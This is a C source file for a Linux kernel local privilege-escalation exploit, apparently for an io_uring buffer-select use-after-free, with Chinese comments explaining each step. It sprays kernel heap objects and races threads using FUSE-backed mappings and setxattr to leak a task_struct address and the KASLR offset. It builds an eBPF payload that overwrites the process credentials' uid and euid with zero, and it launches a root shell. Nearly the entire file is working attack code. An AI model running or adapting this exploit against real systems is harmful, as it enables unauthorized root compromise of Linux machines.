#define _GNU_SOURCE
#include <time.h>
#include <fcntl.h>
#include <stdio.h>
#include <liburing.h>
#include <stdlib.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sched.h>
#include <linux/bpf.h>
#include <sys/xattr.h>
#include <string.h>

#include "bpf_defs.h" 
#define QUEUE_DEPTH 0x800
#define PAGE_SIZE 0x1000

#define TASK_STRUCT_CRED_OFFSET 0x6b8
#define CRED_UID_OFFSET         0x4
#define CRED_EUID_OFFSET        0x14
#define BPF_PROG_RUN_OFFSET     0xFE260

#define SINGLE_START 0xffffffff8125ad40
#define SINGLE_NEXT  0xffffffff8125ad50


int group_v1 = 0x1337;
int group_v2 = 0x333;
int procmaps_fd = -1;
long task_struct_addr = 0;
int *upper_tsk = (int *)&task_struct_addr + 1;
int *lower_tsk = (int *)&task_struct_addr;
long bpf_prog_run32_addr = 0;
long fake_bpf_prog_addr = 0;
size_t kaslr_offset = 0;

char buf_v1[0x1000][0x100] = {0};
char buf_v2[0x1000][0x100] = {0};

pthread_mutex_t lock1 = {0};
pthread_mutex_t lock2 = {0};
pthread_mutex_t lock3 = {0};
pthread_mutex_t lock4 = {0};
pthread_mutex_t lock5 = {0};

void *copy_map1 = NULL;
void *copy_map2 = NULL;
void *copy_map3 = NULL;

void *sleep_map1 = NULL;
void *sleep_map2 = NULL;
void *sleep_map3 = NULL;
void *block_map1 = NULL;



struct io_uring ring = {0};
struct io_uring_params uring_params = {0};

void failure(char * msg){
    perror(msg); exit(1);
}

void unshare_setup(uid_t uid, gid_t gid){
    int temp;
    char edit[0x100];
    unshare(CLONE_NEWNS|CLONE_NEWUSER);
    temp = open("/proc/self/setgroups", O_WRONLY);
    write(temp, "deny", strlen("deny"));
    close(temp);
    temp = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", uid);
    write(temp, edit, strlen(edit));
    close(temp);
    temp = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", gid);
    write(temp, edit, strlen(edit));
    close(temp);
    return;
}


void setup_bpf(void){
    struct bpf_insn insn[] = {
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),
        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN()
    };
    if(bpf_prog_load(insn, sizeof(insn) / sizeof(insn[0])) != 0){
        printf("[x] Load eBPF program failed...\n");
        exit(1);
    }
}

void setup_fuse(void){
    int result = -1;
    char *cmd = "mkdir -p /tmp/fuse_mount && ./hog_fs /tmp/fuse_mount";
    int fuse_fd1 = -1;
    int fuse_fd2 = -1;
    int fuse_fd3 = -1;
    int fuse_fd4 = -1;

    if(system(cmd) != 0){
        failure("system");
    }
    
    fuse_fd1 = open("/tmp/fuse_mount/task", O_RDWR);
    if(fuse_fd1 < 0){
        failure("open");
    }
    copy_map1 = mmap((void *)0x1000, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);
    if(copy_map1 == MAP_FAILED){
        failure("mmap");
    }
    sleep_map1 = mmap(copy_map1 + PAGE_SIZE, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE, fuse_fd1, 0);
    if(copy_map1 + PAGE_SIZE != sleep_map1){
        failure("mmap");
    }
    

    fuse_fd2 = open("/tmp/fuse_mount/seqop", O_RDWR);
    if(fuse_fd2 < 0){
        failure("open");
    }
    copy_map2 = mmap(sleep_map1 + PAGE_SIZE, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);
    if(copy_map2 == MAP_FAILED){
        failure("mmap");
    }
    sleep_map2 = mmap(copy_map2 + PAGE_SIZE, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE, fuse_fd2, 0);
    if(copy_map2 + PAGE_SIZE != sleep_map2){
        failure("mmap");
    }


    fuse_fd3 = open("/tmp/fuse_mount/iobuf", O_RDWR);
    if(fuse_fd3 < 0){
        failure("open");
    }
    copy_map3 = mmap(sleep_map2 + PAGE_SIZE, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, 0, 0);
    if(copy_map3 == MAP_FAILED){
        failure("mmap");
    }
    sleep_map3 = mmap(copy_map3 + PAGE_SIZE, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE, fuse_fd3, 0);
    if(copy_map3 + PAGE_SIZE != sleep_map3){
        failure("mmap");
    }

    
    fuse_fd4 = open("/tmp/fuse_mount/bpfprog", O_RDWR);
    if(fuse_fd4 < 0){
        failure("open");
    }
    block_map1 = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE, fuse_fd4, 0);
    if(block_map1 == MAP_FAILED){
        failure("mmap");
    }
}

void *io_uring_thread1_func(void *blah){
    struct io_uring_sqe *sqe = NULL;
    struct io_uring_cqe *cqe = NULL;
    struct timespec tim = {0};

    /* 这里指定的是在tv_sec基础上额外的纳秒数 */
    tim.tv_nsec = 30001337;
   
    /* 为本线程的后续内存分配都集中在CPU1上 */
    cpu_set_t cpuset;
    /* 初始化CPU集合cpuset */
    CPU_ZERO(&cpuset);
    /* 将指定的CPU添加到CPU集合 */
    CPU_SET(1, &cpuset);
    /* 设置本进程对于cpuset里面标记的亲和性 */
    sched_setaffinity(0, sizeof(cpu_set_t), &cpuset);

    /* 试图获取lock1 */
    pthread_mutex_lock(&lock1);

    /* 纳妙级别的sleep */
    nanosleep(&tim, NULL);

    sqe = io_uring_get_sqe(&ring);

    /* 分配2个大小为0x100的数组的io_buffer, 其中bid为0, bgid为group_v2 */
    io_uring_prep_provide_buffers(sqe, buf_v2, 0x100, 2, group_v2, 0);
    /* 将这个sqe提交到sqring当中 */
    io_uring_submit(&ring);         //three
    /* 等待sqe完成,并获取cqe */
    io_uring_wait_cqe(&ring, &cqe); //four
    io_uring_cqe_seen(&ring, cqe);

    /* 用来设置线程的CPU亲和性 */
    if(io_uring_register_iowq_aff(&ring, sizeof(cpu_set_t), &cpuset) != 0){
        fprintf(stderr, "++ register failed: %m\n");
    }


    sqe = io_uring_get_sqe(&ring);
    /* procmaps_fd是要读取的文件描述符,这里的buf是指向存储数据缓冲区的指针,最后一个参数为offset */
    io_uring_prep_read(sqe, procmaps_fd, buf_v1[3], 0x20, 0);
    /* 这里添加这个标志将导致在io_read之前先调用io_rw_buffer_select */
    /* 也就会导致req->rw.addr被填入内核中的io_buffer数据结构体的地址 */
    io_uring_sqe_set_flags(sqe, IOSQE_BUFFER_SELECT);
    sqe->buf_group = group_v1;
    io_uring_submit(&ring);     //five
    io_uring_wait_cqe(&ring, &cqe); //six
    io_uring_cqe_seen(&ring, cqe);

    if(cqe->res < 0){
        fprintf(stdout, "[x]io_read_faild...\n");
    }
    /* 唤醒io_uring_thread2, 使得其可以迅速收回刚刚free掉的io_buffer */
    pthread_mutex_unlock(&lock1);
    /* 这里由主线程唤醒 */
    pthread_mutex_lock(&lock2);
    nanosleep(&tim, NULL);

    sqe = io_uring_get_sqe(&ring);
    /* 这里是由主线程重新分配了刚刚释放掉的io_buffer */
    /* 然而这里io_buffer链条则少了最后的一项,因此这里偏移需要加一个0x20 */
    io_uring_prep_read(sqe, procmaps_fd, buf_v1[0], 0x40, 0);
    io_uring_sqe_set_flags(sqe, IOSQE_BUFFER_SELECT);
    sqe->buf_group = group_v1;
    io_uring_submit(&ring);
    io_uring_wait_cqe(&ring, &cqe);
    io_uring_cqe_seen(&ring, cqe);

    /* 分配seq_operation */
    open("/proc/cmdline", O_RDONLY);
    
    pthread_mutex_lock(&lock3);
    nanosleep(&tim, NULL);

    sqe = io_uring_get_sqe(&ring);
    io_uring_prep_read(sqe, procmaps_fd, buf_v1[0], 0x20, 0);
    io_uring_sqe_set_flags(sqe, IOSQE_BUFFER_SELECT);
    sqe->buf_group = group_v1;
    io_uring_submit(&ring);
    io_uring_wait_cqe(&ring, &cqe);
    io_uring_cqe_seen(&ring, cqe);

    sqe = io_uring_get_sqe(&ring);
    io_uring_prep_provide_buffers(sqe, buf_v1, 0x100, 2, group_v1, 0);
    io_uring_submit(&ring);
    io_uring_wait_cqe(&ring, &cqe);
    io_uring_cqe_seen(&ring, cqe);

    pthread_mutex_lock(&lock5);
    return NULL;
}

void *io_uring_thread2_func(void *blah){
    struct io_uring_sqe *sqe = NULL;
    struct io_uring_cqe *cqe = NULL;
    struct timespec tim = {0};
    cpu_set_t cpuset = {0};
    tim.tv_nsec = 3001337;

    CPU_ZERO(&cpuset);
    CPU_SET(1, &cpuset);
    sched_setaffinity(0, sizeof(cpu_set_t), &cpuset);

    nanosleep(&tim, NULL);
    pthread_mutex_lock(&lock1);
    // nanosleep(&tim, NULL);

    sqe = io_uring_get_sqe(&ring);
    io_uring_prep_provide_buffers(sqe, buf_v2, 0x100, 2, group_v2, 0);
    io_uring_submit(&ring);         //seven
    io_uring_wait_cqe(&ring, &cqe);     //eigh
    io_uring_cqe_seen(&ring, cqe);

    pthread_mutex_lock(&lock4);

    if(!getuid()){
        sleep(1);
        printf("[+] ...\n");
        system("sh");
    }
    return NULL;

}

void do_setxattr(void *xattr_buf, void *leak_buf, pthread_mutex_t *lock){
    pthread_mutex_unlock(lock);
    /* 分配0x20的内核通用内存 */
    /* 设置name为user.lol, value为xattr_buf的属性值,大小为32*/
    if(setxattr("xa.txt", "user.xa", xattr_buf, 32, 0) < 0){
        perror("setxattr");
    }
    /* 与上面相反,是获取 */
    getxattr("xa.txt", "user.xa", leak_buf, 32);
}



long prep_setxattr(long cmd){
    long ret = 0;
    char *xattr_buf = NULL;
    long *retptr = NULL;
    long *leakptr = NULL;
    pthread_mutex_t *lock = NULL;
    long leak[4] = {0};

    struct bpf_insn exploit[] = {
        BPF_MOV32_IMM(BPF_REG_0, 0),
        BPF_MOV32_IMM(BPF_REG_1, *upper_tsk),
        BPF_ALU64_IMM(BPF_LSH, BPF_REG_1, 32),
        BPF_MOV32_IMM(BPF_REG_2, *lower_tsk),
        BPF_ALU64_REG(BPF_ADD, BPF_REG_1, BPF_REG_2),
        BPF_LDX_MEM(BPF_DW, BPF_REG_2, BPF_REG_1, TASK_STRUCT_CRED_OFFSET),
        BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_0, CRED_UID_OFFSET),
        BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_0, CRED_EUID_OFFSET),
        BPF_EXIT_INSN()
    };

    switch(cmd){
        case 0:
            xattr_buf = copy_map1 + PAGE_SIZE - 31;
            retptr = &leak[2];
            leakptr = leak;
            lock = &lock1;
            break;
        case 1:
            xattr_buf = copy_map2 + PAGE_SIZE - 31;
            retptr = &leak[2];
            leakptr = leak;
            lock = &lock2;
            break;
        case 2:
            xattr_buf = copy_map3 + PAGE_SIZE - 31;
            retptr = &leak[1];
            leakptr = leak;
            lock = &lock3;
            break;
        case 3:
            xattr_buf = copy_map1 + PAGE_SIZE - 31;
            retptr = &leak[1];
            leakptr = leak;
            lock = &lock3;
            break;
        case 4:
            xattr_buf = copy_map3 + PAGE_SIZE - 31;
            retptr = &leak[1];
            leakptr = leak;
            lock = &lock3;
            break;
        case 5:
            xattr_buf = copy_map3 + PAGE_SIZE - 31;
            retptr = &leak[1];
            leakptr = leak;
            lock = &lock3;
            break;
    }
    do_setxattr(xattr_buf, leakptr, lock);

    for(int i = 0; i < 4; i++){
        printf("leak: 0x%lx\n", leak[i]);
    }
    return *retptr;

}


void *setxattr_thread_routine(void *cmd){
    struct timespec tim = {0};
    cpu_set_t cpuset = {0};
    tim.tv_nsec = 1001337;
    CPU_ZERO(&cpuset);
    CPU_SET(0, &cpuset);
    sched_setaffinity(0, sizeof(cpu_set_t), &cpuset);

    pthread_mutex_lock(&lock3);
    nanosleep(&tim, NULL);
    
    prep_setxattr((long)cmd);
}

void create_io_uring_threads(void){
    pthread_t thread1 = {0};
    pthread_t thread2 = {0};

    /* 依次创建两个使用io_uring的线程 */
    pthread_create(&thread1, NULL, io_uring_thread1_func, NULL);
    pthread_create(&thread2, NULL, io_uring_thread2_func, NULL);

}

void create_setxattr_threads(void){
    struct timespec tim = {0};
    pthread_t thread1 = {0};
    pthread_t thread2 = {0};
    pthread_t thread3 = {0};
    
    tim.tv_nsec = 2001337;

    pthread_create(&thread1, NULL, setxattr_thread_routine, (void *)3);
    nanosleep(&tim, NULL);
    pthread_create(&thread2, NULL, setxattr_thread_routine, (void *)4);
    nanosleep(&tim, NULL);
    pthread_create(&thread3, NULL, setxattr_thread_routine, (void *)5);

}


void setup(void){
    int xa_fd = -1;
    cpu_set_t cpuset;
    struct io_uring_sqe *sqe;
    struct io_uring_cqe *cqe;
    struct io_uring_params params = {0};

    /* 创建线程后阻塞 */
    pthread_mutex_lock(&lock1);
    pthread_mutex_lock(&lock2);
    pthread_mutex_lock(&lock3);
    pthread_mutex_lock(&lock4);
    pthread_mutex_lock(&lock5);

    xa_fd = open("xa.txt", O_RDWR | O_CREAT, 0666);
    if(xa_fd < 0){
        printf("[x]set/getxattr file create filed...\n");
        exit(1);
    }
    printf("[+]set/getxattr file created!\n");

    setup_bpf();
    printf("[+]eBPF prog created Successfully!\n");


    unshare_setup(getuid(), getgid());

    /* 映射fuse中的文件到用户虚拟内存 */
    setup_fuse();
    printf("[+]fuse map successfully!\n");
    
    /* 为本进程的后续内存分配都集中在CPU1上 */
    /* 初始化CPU集合cpuset */
    CPU_ZERO(&cpuset);
    /* 将指定的CPU添加到CPU集合 */
    CPU_SET(1, &cpuset);
    /* 设置本进程对于cpuset里面标记的亲和性 */
    sched_setaffinity(0, sizeof(cpu_set_t), &cpuset);

    /* 创建使用io_uring的线程,但此时未释放锁 */
    create_io_uring_threads();
    /* 创建setxattr线程 */
    create_setxattr_threads();

    /* 选这个文件是因为他没实现read/write _iter, 因此会调用loop_rw_iter函数 */
    procmaps_fd = open("/proc/self/maps", O_RDONLY);
    if(procmaps_fd < 0){
        failure("open");
    }
    printf("[+]Open the /proc/self/maps Successfully!\n");


    printf("[*]Tryinng to initialize the io_uring...\n");
    /* 实现和io_uring_queue_init()类似,只不过这里传递的参数不同罢了 */
    if(io_uring_queue_init_params(QUEUE_DEPTH, &ring, &uring_params) != 0){
        printf("[x]Initialize the io_uring failed...\n");
        exit(1);
    }
    printf("[+]Initialize the io_uring successfully!\n");
   
    if (0 != io_uring_register_iowq_aff(&ring, sizeof(cpu_set_t), &cpuset))    // io_uring_register_iowq_aff() —— set affinity of iou_wrk
    {
        fprintf(stderr, "++ register failed: %m\n");
        exit(1);
    }

    printf("[*]Trying to spray the kmalloc-32 with io_buffer...\n");
    sqe = io_uring_get_sqe(&ring);
    /* 让内核分配1000个struct io_buffer 结构体*/
    /* 经过计算一个kmalloc-32通用内存的slab是一个page大小,也就是说可以容纳128个io_buffer, bid=3 */
    io_uring_prep_provide_buffers(sqe, buf_v1, 0x100, 1000, group_v1, 0);
    io_uring_submit(&ring);  //one
    /* 等待上面的堆喷事件的结束 */
    io_uring_wait_cqe(&ring, &cqe);     //two
    /* 这里是为了告知内核这个cqe已经被处理过了,适当清理空间 */
    io_uring_cqe_seen(&ring, cqe);
    /* 这里的字段是返回的结果状态code */
    if(cqe->res < 0){
        printf("[x]spary the io_buffer failed...\n");
        exit(1);
    }
    
    printf("[*]Trigger task_struct leak...\n");
    task_struct_addr = prep_setxattr(0);
    printf("[+]task_struct: 0x%lx\n", task_struct_addr);

    printf("[*]Trigger for KASLR leak...\n");
    kaslr_offset = prep_setxattr(1) - SINGLE_NEXT;
    printf("[+]KASLR is 0x%lx\n", kaslr_offset);

    getchar();

    sqe = io_uring_get_sqe(&ring);
    io_uring_prep_provide_buffers(sqe, buf_v1, 0x100, 1000, group_v1, 0);
    io_uring_submit(&ring);
    io_uring_wait_cqe(&ring, &cqe);
    io_uring_cqe_seen(&ring, cqe);

    printf("[*]vuln trigger #3 for cache ptr leak\n");
    fake_bpf_prog_addr = prep_setxattr(2) + 0x30;
    printf("[+]fake_bpf_prog_addr: 0x%lx\n", fake_bpf_prog_addr);

    sqe = io_uring_get_sqe(&ring);

    io_uring_prep_provide_buffers(sqe, buf_v1, 0x100, 5, group_v1, 0);
    io_uring_submit(&ring);
    io_uring_wait_cqe(&ring, &cqe);
    io_uring_cqe_seen(&ring, cqe);

    // attach_bpf_prog();
    
    sqe = io_uring_get_sqe(&ring);
    io_uring_prep_read(sqe, procmaps_fd, buf_v1[0], 0x20, 0);
    io_uring_sqe_set_flags(sqe, IOSQE_BUFFER_SELECT);
    sqe->buf_group = group_v1;
    io_uring_submit(&ring);
    io_uring_wait_cqe(&ring, &cqe);
    io_uring_cqe_seen(&ring, cqe);

    getchar();



}

int main(void){
    setup();
    return 0;

}

